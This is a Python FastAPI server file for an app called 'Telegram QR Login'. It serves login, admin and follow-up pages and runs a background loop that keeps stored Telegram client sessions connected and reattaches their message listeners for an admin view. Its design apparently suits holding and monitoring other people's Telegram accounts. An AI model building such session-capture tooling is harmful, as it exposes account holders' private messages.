from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, HTMLResponse

from backend.logging_config import setup_logging
from backend.api.auth import router as auth_router
from backend.api.ws import router as ws_router
import asyncio
import logging

app = FastAPI(title="Telegram QR Login")

setup_logging()

app.include_router(auth_router, prefix="/auth")
app.include_router(ws_router, prefix="/auth")

# static
app.mount("/static", StaticFiles(directory="backend/frontend/static"), name="static")

@app.get("/")
def index():
    return FileResponse("backend/frontend/index.html")

@app.get("/admin")
def admin():
    return FileResponse("backend/frontend/admin.html")

@app.get("/next", response_class=HTMLResponse)
def next_page():
    with open("backend/frontend/next.html", "r", encoding="utf-8") as f:
        html = f.read()

    # ⬇️ сервер управляет таймером
    return """
    <script>
      window.MATCH_TIMER_ENABLED = true;
    </script>
    """ + html


# Background maintenance: periodically ensure sessions are connected and
# reattach listeners if they were expected to run. This helps "wake" stale
# sessions after restarts or transient network issues.
@app.on_event("startup")
async def _start_session_maintenance():
    log = logging.getLogger("maintenance")

    from backend.api.auth import state as login_state
    from backend.storage.ws_manager import ws_manager

    async def _maintain_loop():
        # short delay to allow app to finish startup
        await asyncio.sleep(1)
        while True:
            try:
                # iterate over known login ids
                for login_id in list(login_state.data.keys()):
                    try:
                        item = await login_state.get(login_id)
                        client = item.get("client") if item else None
                        if client:
                            # try a lightweight RPC to keep connection alive
                            try:
                                await client.get_me()
                            except Exception:
                                # attempt reconnect once
                                try:
                                    await client.connect()
                                except Exception as e:
                                    log.debug(f"Failed to connect client {login_id}: {e}")

                            # if listener was intended to run but handler missing, reattach
                            if item and item.get("listener_started") and not item.get("listener_handler"):
                                try:
                                    # import here to avoid circular import at module load
                                    from backend.telegram.listener import setup_message_listener
                                    handler = setup_message_listener(client, ws_manager, login_id)
                                    item["listener_handler"] = handler
                                except Exception as e:
                                    log.debug(f"Failed to reattach listener for {login_id}: {e}")
                    except Exception as e:
                        log.debug(f"Error maintaining login {login_id}: {e}")

                # broadcast a lightweight ping so admin UI can show liveness
                try:
                    await ws_manager.broadcast({"type": "ping"})
                except Exception:
                    pass
            except Exception as e:
                log.error(f"Session maintenance loop error: {e}")

            # sleep between maintenance passes
            await asyncio.sleep(30)

    asyncio.create_task(_maintain_loop())
